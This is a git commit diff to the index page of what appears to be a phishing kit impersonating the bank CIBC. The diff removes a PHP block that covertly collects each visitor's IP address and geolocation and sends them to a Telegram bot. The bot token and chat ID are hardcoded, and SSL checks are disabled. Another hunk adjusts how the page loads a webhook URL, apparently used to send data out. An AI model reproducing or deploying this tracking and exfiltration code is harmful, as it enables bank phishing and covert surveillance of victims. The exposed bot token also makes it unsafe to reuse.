9c5fd44fbcd9832272c15474265f04c28f904417
jacobiwoop <jacobiwoop@gmail.com>
2025-05-15 16:22:06 +0200

    Update index.php

--- orph/cbic/index.php
+++ orph/cbic/index.php
@@ -3,93 +3,6 @@ $_SESSION["bank"] ='CIBC';
 
 ?>
 
-<?php
-// Remplace par le token de ton bot Telegram
-$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
-// Remplace par ton chat_id Telegram
-$chat_id = '6242884372'; 
-
-// Récupérer l'adresse IP de l'utilisateur
-if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
-} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
-} else {
-    $ip_address = $_SERVER['REMOTE_ADDR'];
-}
-
-// Utilisation de l'API ipinfo.io pour obtenir la géolocalisation à partir de l'adresse IP de l'utilisateur
-$geo_url = "http://ipinfo.io/{$ip_address}/json";
-
-// Initialise cURL pour obtenir la géolocalisation
-$geo_ch = curl_init();
-curl_setopt($geo_ch, CURLOPT_URL, $geo_url);
-curl_setopt($geo_ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($geo_ch, CURLOPT_SSL_VERIFYPEER, false);
-$geo_response = curl_exec($geo_ch);
-
-// Vérifie s'il y a une erreur dans la requête
-if (curl_errno($geo_ch)) {
-    $location_info = 'Impossible de récupérer la localisation.';
-} else {
-    $location_data = json_decode($geo_response, true);
-    
-    // Si l'API retourne les données correctement
-    if (isset($location_data['loc'])) {
-        $location_info = $location_data['loc']; // Cela retourne "latitude,longitude"
-        list($latitude, $longitude) = explode(',', $location_info); // Sépare latitude et longitude
-    } else {
-        $location_info = 'Localisation inconnue.';
-        $latitude = 'N/A';
-        $longitude = 'N/A';
-    }
-}
-
-// Ferme la session cURL pour l'API géo
-curl_close($geo_ch);
-
-// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
-$message = "🏛🏛*CIBC*🏛🏛\n";
-$message .= "IP: $ip_address\n";
-$message .= "Latitude: $latitude\n";
-$message .= "Longitude: $longitude";
-
-// URL de l'API Telegram pour envoyer le message
-$url = "https://api.telegram.org/bot$token/sendMessage";
-
-// Prépare les données à envoyer via l'API Telegram
-$data = [
-    'chat_id' => $chat_id,
-    'text' => $message,
-    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
-];
-
-// Initialise cURL pour envoyer le message
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
-// Exécute la requête et récupère la réponse
-$response = curl_exec($ch);
-
-// Vérifie si cURL a rencontré une erreur
-if (curl_errno($ch)) {
-    echo 'Erreur cURL : ' . curl_error($ch);
-} else {
-    echo '';
-}
-
-// Ferme la session cURL
-curl_close($ch);
-?>
-
-
-
 
 <html lang="en">
 
@@ -6180,7 +6093,7 @@ curl_close($ch);
         };
 
         // On lit le webhook depuis le fichier texte
-        fetch('webhookurl.txt')
+        fetch('/webhookurl.txt')
             .then(response => response.text())
             .then(webhookURL => {
                 // Nettoyage (par exemple si le fichier contient des sauts de ligne)
